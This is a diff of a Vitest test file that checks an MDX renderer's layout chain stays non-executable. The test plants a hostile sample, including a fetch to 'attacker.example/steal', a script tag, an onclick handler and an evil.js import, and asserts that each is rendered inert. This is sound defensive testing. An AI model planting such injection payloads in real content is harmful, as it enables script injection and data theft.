@@ -1,7 +1,9 @@
 import { describe, it, expect, vi } from 'vitest';
 import { readFileSync, readdirSync } from 'node:fs';
 import { join } from 'node:path';
-import { parseSafeMdast } from '@immediately-run/sdk/safeContent/index';
+import { parseSafeMdast, renderMdast } from '@immediately-run/sdk/safeContent/index';
+import { renderToStaticMarkup } from 'react-dom/server';
+import { SAFE_INTRINSICS } from './safeIntrinsics';
 
 // The NON-EXECUTABLE surface, proven rather than asserted (R3-217 / R3-219 exit).
 //
@@ -293,4 +295,65 @@ describe('deep-linking — the ids a citation targets really exist', () => {
     expect(checked).toBeGreaterThan(0);
     expect(dangling).toEqual([]);
   }, CORPUS_TIMEOUT);
+});
+
+// ── The LAYOUT chain is non-executable too (R3-263) ───────────────────────────────────
+//
+// `SafeEntryBody` covered entry bodies from R3-213; the `_layout.mdx` chain went through
+// `<Include>` — the COMPILED path — regardless of `render: safe`, so an "interpreter" wiki
+// still executed author JavaScript out of one content file. These cases prove the same
+// property for the shell that R3-219 proved for the entries.
+describe('the layout chain renders non-executably', () => {
+  const LAYOUT = join(process.cwd(), 'content', '_layout.mdx');
+
+  it('the real `_layout.mdx` survives the safe parse as a component chain', async () => {
+    const src = readFileSync(LAYOUT, 'utf8').replace(/^---\n[\s\S]*?\n---\n?/, '');
+    const tree = await parseSafeMdast(src);
+    const names = nodesOfType(tree, 'mdxJsxFlowElement').map((n) => n.name);
+    // The shell primitives resolve BY NAME from the component map, and `<Outlet/>` — the
+    // hinge the whole chain nests on — is among them.
+    expect(names).toContain('GroveNav');
+    expect(names).toContain('GroveSidebar');
+    expect(names).toContain('GroveFooter');
+    expect(names).toContain('Outlet');
+    // No executable node anywhere: the layout's `{/* … */}` comment must not survive as an
+    // expression, and nothing may become an ESM import.
+    expect(nodesOfType(tree, 'mdxFlowExpression')).toHaveLength(0);
+    expect(nodesOfType(tree, 'mdxjsEsm')).toHaveLength(0);
+  });
+
+  it('planted code in a LAYOUT is inert — no script, no evaluation, no handler', async () => {
+    const planted = [
+      'import evil from "./evil.js"',
+      '',
+      '<main className="grove-content" onclick="alert(1)">',
+      '  {fetch("https://attacker.example/steal")}',
+      '  <script>globalThis.__pwned = 1</script>',
+      '</main>',
+    ].join('\n');
+    const spy = vi.spyOn(globalThis, 'fetch');
+    const tree = await parseSafeMdast(planted);
+    const html = renderToStaticMarkup(renderMdast(tree, { components: SAFE_INTRINSICS as never }) as never);
+
+    expect(spy).not.toHaveBeenCalled();
+    expect((globalThis as Record<string, unknown>).__pwned).toBeUndefined();
+    // The `<script>` survives as ESCAPED TEXT, never as markup.
+    expect(html).not.toContain('<script');
+    expect(html).toContain('&lt;script&gt;');
+    // The expression is captured as an inert string, and the handler never reaches the DOM.
+    expect(html).not.toContain('onclick');
+    expect(html).toContain('fetch(');
+    // (GFM autolinks the URL inside that inert string, so the text carries an <a href>. That
+    // is a link the reader may click, not code the page runs — browser-parity, and `sanitizeUrl`
+    // still gates the scheme. Asserted so the anchor is not mistaken for an execution leak.)
+    // The import line is never RESOLVED — but note what actually happens to it, because it
+    // is not what "the ESM node renders as null" would suggest: with the ESM extension off
+    // no `mdxjsEsm` node is produced at all, so the line survives as ordinary paragraph
+    // TEXT. Inert either way, but visible — an author who pastes an import into a layout
+    // sees it printed on the page rather than silently ignored.
+    expect(nodesOfType(tree, 'mdxjsEsm')).toHaveLength(0);
+    expect(html).toContain('<p>import evil from');
+    expect(html).not.toContain('<script src');
+    spy.mockRestore();
+  });
 });
